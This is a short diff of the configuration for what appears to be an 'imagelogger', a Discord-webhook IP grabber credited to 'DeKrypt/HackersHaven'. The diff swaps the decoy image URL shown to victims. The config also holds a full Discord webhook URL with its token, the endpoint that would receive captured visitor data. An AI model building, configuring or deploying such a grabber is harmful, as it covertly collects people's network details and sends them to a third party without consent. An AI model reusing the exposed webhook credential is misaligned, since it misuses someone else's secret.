@@ -13,7 +13,7 @@ __author__ = "DeKrypt/HackersHaven"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1409278240111067400/IQY21q05zYYlToNOoId4tSmE_T99KnpVnm0eSxShTRNZLKiH5hRXWWoGeZJdAVwWN-OY",
-    "image": "https://t3.ftcdn.net/jpg/02/36/99/22/360_F_236992283_sNOxCVQeFLd5pdqaKGh8DRGMZy7P4XKm.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://ih1.redbubble.net/image.460763775.2054/raf,360x360,075,t,fafafa:ca443f4786.u5.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
